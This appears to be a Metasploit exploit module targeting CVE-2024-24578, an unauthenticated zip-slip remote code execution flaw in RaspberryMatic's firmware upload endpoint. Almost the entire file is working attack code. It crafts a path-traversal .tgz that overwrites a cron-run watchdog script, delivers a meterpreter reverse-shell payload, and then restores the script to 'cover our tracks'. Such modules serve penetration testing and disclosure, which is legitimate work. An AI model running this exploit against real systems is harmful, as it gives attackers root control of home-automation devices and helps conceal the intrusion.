##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'RaspberryMatic unauthenticated Remote Code Execution vulnerability through HMServer File Upload.',
        'Description' => %q{
          RaspberryMatic / OCCU contains a unauthenticated remote code execution (RCE) vulnerability, caused by multiple
          issues within the Java based HMIPServer.jar component. The webui allows for Firmware uploads which can be reached
          through the URL `/pages/jpages/system/DeviceFirmware/addFirmware`.
          This allows an unauthenticated attacker to upload a malicious .tgz archive to the server, which will be
          automatically extracted without any further checks. As this entry can contain ../sequences, it is possible to
          break out of the predefined temp directory and write files to other locations outside this path.

          This vulnerability is commonly known as the Zip Slip vulnerability and can be used to overwrite arbitrary files
          on the main filesystem. It is therefore possible to overwrite the watchdog script with a malicious payload in
          `/usr/local/addons/mediola/bin/`, which will be executed every five minutes through a cron job where attackers
          can gain remote code execution as root user, allowing a full system compromise.

          RaspberryMatic versions <= `3.73.9.20240130` are vulnerable.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die-gr3y <h00die.gr3y[at]gmail.com>', # MSF module contributor
          'h0ng10 <https://git.hub/h0ng10>' # discovery of this vulnerability
        ],
        'References' => [
          ['CVE', '2024-24578'],
          ['URL', 'https://attackerkb.com/topics/ywHhBnSObR/cve-2024-24578'],
          ['URL', 'https://github.com/jens-maus/RaspberryMatic/security/advisories/GHSA-q967-q4j8-637h']
        ],
        'DisclosureDate' => '2024-03-16',
        'Platform' => ['unix', 'linux'],
        'Arch' => [ARCH_CMD],
        'Privileged' => true,
        'Targets' => [
          [
            'Unix/Linux Command',
            {
              'Platform' => ['unix', 'linux'],
              'Arch' => [ARCH_CMD],
              'Type' => :unix_cmd,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/linux/http/aarch64/meterpreter_reverse_tcp',
                'FETCH_WRITABLE_DIR' => '/tmp'
              }
            }
          ]
        ],
        'DefaultTarget' => 0,
        'DefaultOptions' => {
          'SSL' => true,
          'RPORT' => 443,
          'WfsDelay' => 5 * 60 # wait at least five minutes for RCE
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )
    register_options([
      OptString.new('TARGETURI', [ true, 'The RaspberryMatic endpoint URL', '/' ]),
    ])
  end

  # Method to construct malicious file in .tgz form
  # @param payload [String] to upload
  # @param fpath [String] to write the payload contents
  # @return [Rex::Text] Malicious .tgz form
  def create_malicious_tgz(payload, fpath)
    tarfile = StringIO.new
    Rex::Tar::Writer.new tarfile do |tar|
      tar.add_file(fpath.to_s, 0o777) do |io|
        io.write payload
      end
    end
    # tarfile.rewind
    # tarfile.close

    Rex::Text.gzip(tarfile.string)
  end

  # CVE-2024-24578: remote code execution via zip slip overwriting watchdog script
  # affected components:
  # web endpoint /pages/jpages/system/DeviceFirmware/addFirmware
  # shell script /usr/local/addons/mediola/bin/watchdog
  def execute_command(cmd, _opts = {})
    # create malicious compressed tar file (tgz) to overwrite watchdog script
    # with malicious payload triggering the RCE
    fname = Rex::Text.rand_text_alphanumeric(8..12)
    fpath = '../../../../../../../../../..//usr/local/addons/mediola/bin/watchdog'
    payload_tgz = create_malicious_tgz(cmd, fpath)

    # construct multipart form data
    form_data = Rex::MIME::Message.new
    form_data.add_part(payload_tgz, 'application/gzip', 'binary', "form-data; name=\"file\"; filename=\"#{fname}.tgz\"")

    # upload the malicious tgz file
    print_status("Uploading #{fname}.tgz")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'pages', 'jpages', 'system', 'DeviceFirmware', 'addFirmware'),
      'ctype' => "multipart/form-data; boundary=#{form_data.bound}",
      'data' => form_data.to_s
    })
    fail_with(Failure::NoAccess, "Upload #{fname}.tgz is not successful.") unless res&.code == 200 && res.body.include?('${addDevFirmwareInfoCorrupt}')
    print_status('Waiting 5 minutes for watchdog execution via cron to trigger the RCE.')
  end

  def on_new_session(session)
    # restore orginal watchdog script to cover our tracks
    print_status('Restoring original watchdog script.')
    if session.type == 'meterpreter'
      session.sys.process.execute('/bin/sh', '-c "echo -ne \'#!/bin/sh\nif [ -e /etc/config/neoDisabled ];then\n\texit 0\nfi\n\n\' > /usr/local/addons/mediola/bin/watchdog"')
      session.sys.process.execute('/bin/sh', '-c "echo -ne \'if [ -e /usr/local/addons/mediola/Disabled ];then\n\texit 0\nfi\n\n\' >> /usr/local/addons/mediola/bin/watchdog"')
      session.sys.process.execute('/bin/sh', '-c "echo -ne \'PIDOFD=\$(pgrep -f \"neo_server.*automation.js\")\n\n\' >> /usr/local/addons/mediola/bin/watchdog"')
      session.sys.process.execute('/bin/sh', '-c "echo -ne \'if [ -z \"\$PIDOFD\" ]; then\n\t/usr/local/etc/config/rc.d/97NeoServer start\nfi\n\' >> /usr/local/addons/mediola/bin/watchdog"')
    else
      session.shell_command_token("echo -ne '#!/bin/sh\nif [ -e /etc/config/neoDisabled ];then\n\texit 0\nfi\n\n' > /usr/local/addons/mediola/bin/watchdog")
      session.shell_command_token("echo -ne 'if [ -e /usr/local/addons/mediola/Disabled ];then\n\texit 0\nfi\n\n' >> /usr/local/addons/mediola/bin/watchdog")
      session.shell_command_token("echo -ne 'PIDOFD=$(pgrep -f \"neo_server.*automation.js\")\n\n' >> /usr/local/addons/mediola/bin/watchdog")
      session.shell_command_token("echo -ne 'if [ -z \"$PIDOFD\" ]; then\n\t/usr/local/etc/config/rc.d/97NeoServer start\nfi\n' >> /usr/local/addons/mediola/bin/watchdog")
    end
    super
  end

  def check
    print_status("Checking if #{peer} can be exploited.")
    res = send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/config/help.cgi')
    })
    return CheckCode::Unknown('No valid response received from target.') unless res&.code == 200 && res.body.include?('${dialogHelpInfoLblVersion}')

    # parse the version number
    # Examples:
    # ${dialogHelpInfoLblVersion} 3.73.9.20240130
    # ${dialogHelpInfoLblVersion} 3.73.9
    version = res.body.match(/\$\{dialogHelpInfoLblVersion\}\s*\d{1,2}\.\d{1,2}\.\d{1,2}/)
    # when found, remove whitespaces to avoid suprises in string splitting and comparison
    unless version.nil?
      version_number = version[0].gsub(/[[:space:]]/, '').split('}')[1]
      # Check if target is vulnerable
      if version_number
        if Rex::Version.new(version_number) <= Rex::Version.new('3.73.9')
          return CheckCode::Appears("RaspberryMatic #{version_number}")
        else
          return CheckCode::Safe("RaspberryMatic #{version_number}")
        end
      end
    end
    CheckCode::Unknown("Parsing version info from #{normalize_uri(target_uri.path, '/config/help.cgi')} failed.")
  end

  def exploit
    print_status("Executing #{target.name} for #{datastore['PAYLOAD']}")
    case target['Type']
    when :unix_cmd
      execute_command(payload.encoded)
    end
  end
end
